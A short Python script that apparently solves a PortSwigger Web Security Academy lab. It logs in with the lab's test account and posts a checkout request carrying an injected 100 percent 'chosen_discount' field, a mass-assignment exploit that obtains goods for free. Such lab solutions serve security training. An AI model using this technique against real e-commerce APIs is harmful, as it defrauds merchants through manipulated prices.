import requests 
from bs4 import BeautifulSoup
from urllib.parse import urlencode

# Login
def lab_login(url): 
    # Getting CSRF Token
    s = requests.Session()
    r = s.get(url + "/login")
    p = BeautifulSoup(r.content, "lxml")
    csrf = p.find(attrs = {'name' : 'csrf'})['value']

    data = {
        "csrf": csrf,
        "username": "wiener",
        "password": "peter"
    }

    r = s.post(url + "/login", data=data)

    return s.cookies.get_dict()

def mass_assign(url, session):
    body = {
        "chosen_discount":{"percentage":100},
        "chosen_products":[{"product_id":"1","quantity":1}]
    }
    r = requests.post(url+"/api/checkout", cookies=session, json=body)
    return r.status_code, r.text

if __name__ == '__main__':
    url = "https://0a5b007904e8ef7880a2e402007d0029.web-security-academy.net"
    session = lab_login(url)
    print(mass_assign(url, session))
